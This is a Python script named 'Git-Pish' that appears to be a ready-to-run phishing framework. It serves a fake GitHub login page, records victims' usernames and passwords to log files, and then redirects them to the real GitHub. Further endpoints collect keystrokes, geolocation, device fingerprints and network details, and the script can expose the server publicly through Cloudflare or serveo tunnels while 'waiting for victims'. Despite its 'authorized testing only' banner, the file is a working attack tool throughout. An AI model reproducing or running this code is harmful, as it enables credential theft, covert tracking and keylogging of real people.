#!/usr/bin/env python3
# Git-Pish - Advanced Phishing Framework
# Author: xspeen
# For Authorized Security Testing Only

import os
import sys
import json
import socket
import threading
import subprocess
import time
import re
import signal
import requests
import argparse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

BANNER = f"""
{RED}╔════════════════════════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}                                                                                    {RED}║
{RED}║{YELLOW}    ██████╗ ██╗████████╗     ██████╗ ██╗███████╗██╗  ██╗                         {RED}║
{RED}║{YELLOW}   ██╔════╝ ██║╚══██╔══╝     ██╔══██╗██║██╔════╝██║  ██║                         {RED}║
{RED}║{YELLOW}   ██║  ███╗██║   ██║        ██████╔╝██║███████╗███████║                         {RED}║
{RED}║{YELLOW}   ██║   ██║██║   ██║        ██╔═══╝ ██║╚════██║██╔══██║                         {RED}║
{RED}║{YELLOW}   ╚██████╔╝██║   ██║        ██║     ██║███████║██║  ██║                         {RED}║
{RED}║{YELLOW}    ╚═════╝ ╚═╝   ╚═╝        ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝                         {RED}║
{RED}║{YELLOW}                                                                                    {RED}║
{RED}║{CYAN}                        Advanced Phishing Framework                                 {RED}║
{RED}║{CYAN}                              Author: xspeen                                         {RED}║
{RED}║{CYAN}                    Authorized Penetration Testing Only                             {RED}║
{RED}║{YELLOW}                                                                                    {RED}║
{RED}╚════════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

# Load phishing page HTML
def load_phishing_page():
    html_path = os.path.join(os.path.dirname(__file__), 'assets', 'github_login.html')
    try:
        with open(html_path, 'r', encoding='utf-8') as f:
            return f.read()
    except:
        # Fallback HTML if file not found
        return '''<!DOCTYPE html>
<html>
<head><title>GitHub Login</title></head>
<body>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</body>
</html>'''

GITHUB_LOGIN_HTML = load_phishing_page()

# Global storage
captured_data = []
data_lock = threading.Lock()
tunnel_process = None
server_instance = None

class GitPhishHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(GITHUB_LOGIN_HTML.encode('utf-8'))
        elif self.path == '/favicon.ico':
            self.send_response(404)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client_ip = self.client_address[0]

        # Try to parse as JSON, otherwise form data
        try:
            json_data = json.loads(post_data)
            data_type = self.path
        except:
            json_data = {}
            data_type = self.path

        if self.path == '/login' or '/login' in self.path:
            # Parse form data
            parsed = urllib.parse.parse_qs(post_data)
            username = parsed.get('username', [''])[0]
            password = parsed.get('password', [''])[0]

            # Display credentials
            print(f"\n{GREEN}╔══════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{GREEN}║{RED}                    CREDENTIALS CAPTURED!                     {GREEN}║{RESET}")
            print(f"{GREEN}╚══════════════════════════════════════════════════════════════╝{RESET}")
            print(f"  {CYAN}Time:{RESET} {timestamp}")
            print(f"  {CYAN}IP:{RESET} {client_ip}")
            print(f"  {CYAN}Username:{RESET} {WHITE}{username}{RESET}")
            print(f"  {CYAN}Password:{RESET} {WHITE}{password}{RESET}")

            # Save to file
            with open('logs/credentials.log', 'a') as f:
                f.write(f"[{timestamp}] {client_ip} | {username}:{password}\n")

            # Save to JSON
            cred_entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'username': username,
                'password': password
            }
            with open('logs/credentials.json', 'a') as f:
                f.write(json.dumps(cred_entry) + '\n')

            # Redirect to real GitHub
            self.send_response(302)
            self.send_header('Location', 'https://github.com/login')
            self.end_headers()

        elif self.path == '/device':
            print(f"\n{CYAN}╔══════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{CYAN}║{YELLOW}                      DEVICE FINGERPRINT                       {CYAN}║{RESET}")
            print(f"{CYAN}╚══════════════════════════════════════════════════════════════╝{RESET}")
            print(f"  {CYAN}Time:{RESET} {timestamp}")
            print(f"  {CYAN}IP:{RESET} {client_ip}")
            print(f"  {CYAN}User Agent:{RESET} {json_data.get('userAgent', 'N/A')[:80]}")
            print(f"  {CYAN}Platform:{RESET} {json_data.get('platform', 'N/A')}")
            print(f"  {CYAN}Screen:{RESET} {json_data.get('screenWidth', 'N/A')}x{json_data.get('screenHeight', 'N/A')}")
            print(f"  {CYAN}Timezone:{RESET} {json_data.get('timezone', 'N/A')}")
            print(f"  {CYAN}Battery:{RESET} {json_data.get('batteryLevel', 'N/A')}%")

            with open('logs/devices.json', 'a') as f:
                json_data['timestamp'] = timestamp
                json_data['ip'] = client_ip
                f.write(json.dumps(json_data) + '\n')

            self.send_response(200)
            self.end_headers()

        elif self.path == '/location':
            print(f"\n{WHITE}╔══════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{WHITE}║{GREEN}                       LOCATION TRACKED!                      {WHITE}║{RESET}")
            print(f"{WHITE}╚══════════════════════════════════════════════════════════════╝{RESET}")
            lat = json_data.get('latitude', 'N/A')
            lon = json_data.get('longitude', 'N/A')
            print(f"  {CYAN}Latitude:{RESET} {lat}")
            print(f"  {CYAN}Longitude:{RESET} {lon}")
            print(f"  {CYAN}Google Maps:{RESET} https://www.google.com/maps?q={lat},{lon}")

            with open('logs/locations.txt', 'a') as f:
                f.write(f"[{timestamp}] {client_ip} | {lat},{lon}\n")

            self.send_response(200)
            self.end_headers()

        elif self.path == '/keystrokes':
            print(f"\n{RED}╔══════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{RED}║{YELLOW}                      KEYSTROKES LOGGED!                      {RED}║{RESET}")
            print(f"{RED}╚══════════════════════════════════════════════════════════════╝{RESET}")
            for k in json_data.get('keystrokes', []):
                print(f"  {CYAN}{k.get('field')}:{RESET} '{k.get('char')}'")

            with open('logs/keystrokes.log', 'a') as f:
                f.write(f"[{timestamp}] {client_ip} | {json.dumps(json_data)}\n")

            self.send_response(200)
            self.end_headers()

        elif self.path == '/network':
            print(f"\n{YELLOW}╔══════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{YELLOW}║{CYAN}                       NETWORK INFO                           {YELLOW}║{RESET}")
            print(f"{YELLOW}╚══════════════════════════════════════════════════════════════╝{RESET}")
            print(f"  {CYAN}Public IP:{RESET} {client_ip}")
            if 'localIP' in json_data:
                print(f"  {CYAN}Local IP:{RESET} {json_data['localIP']}")
            if 'effectiveType' in json_data:
                print(f"  {CYAN}Network Type:{RESET} {json_data['effectiveType']}")

            with open('logs/network_profiles.json', 'a') as f:
                json_data['timestamp'] = timestamp
                json_data['public_ip'] = client_ip
                f.write(json.dumps(json_data) + '\n')

            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(200)
            self.end_headers()

def start_cloudflared(port):
    global tunnel_process
    print(f"{CYAN}[*] Starting Cloudflare tunnel on port {port}...{RESET}")
    try:
        tunnel_process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(5)
        # Extract URL from stderr
        for line in tunnel_process.stderr:
            match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', line)
            if match:
                print(f"{GREEN}[+] Public URL: {match.group()}{RESET}")
                break
    except FileNotFoundError:
        print(f"{RED}[!] cloudflared not found. Install: pkg install cloudflared or apt install cloudflared{RESET}")
    except Exception as e:
        print(f"{RED}[!] Tunnel error: {e}{RESET}")

def start_ssh_tunnel(port):
    print(f"{CYAN}[*] Starting SSH tunnel on port {port}...{RESET}")
    print(f"{YELLOW}[!] Run this command manually in another terminal:{RESET}")
    print(f"{WHITE}    ssh -R 80:localhost:{port} serveo.net{RESET}")

def signal_handler(sig, frame):
    print(f"\n{RED}[!] Shutting down...{RESET}")
    if server_instance:
        server_instance.shutdown()
    if tunnel_process:
        tunnel_process.terminate()
    sys.exit(0)

def main():
    global server_instance

    parser = argparse.ArgumentParser(description='Git-Pish Phishing Framework')
    parser.add_argument('--port', type=int, default=8080, help='Port to listen on (default: 8080)')
    parser.add_argument('--tunnel', choices=['cloudflare', 'ssh', 'none'], default='none', help='Tunnel type')
    parser.add_argument('--silent', action='store_true', help='Silent mode (no console output)')
    parser.add_argument('--cli', action='store_true', help='Launch CLI mode')

    args = parser.parse_args()

    if args.cli:
        # Launch CLI version
        subprocess.run([sys.executable, 'git-pish-cli.py'])
        return

    # Create logs directory
    os.makedirs('logs', exist_ok=True)

    # Clear screen
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)

    if not args.silent:
        print(f"{YELLOW}[!] Authorized penetration testing only{RESET}\n")

    # Start server
    server_instance = HTTPServer(('0.0.0.0', args.port), GitPhishHandler)
    server_thread = threading.Thread(target=server_instance.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    print(f"{GREEN}[+] Git-Pish server started on port {args.port}{RESET}")
    print(f"    Local: http://localhost:{args.port}")

    # Get local IP
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        if local_ip != '127.0.0.1':
            print(f"    LAN: http://{local_ip}:{args.port}")
    except:
        pass

    # Start tunnel
    if args.tunnel == 'cloudflare':
        start_cloudflared(args.port)
    elif args.tunnel == 'ssh':
        start_ssh_tunnel(args.port)

    print(f"\n{YELLOW}[*] Waiting for victims... Press Ctrl+C to stop{RESET}")
    print(f"{CYAN}[*] Capturing: Credentials | Location | Device | Network | Keystrokes{RESET}\n")

    signal.signal(signal.SIGINT, signal_handler)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == '__main__':
    main()
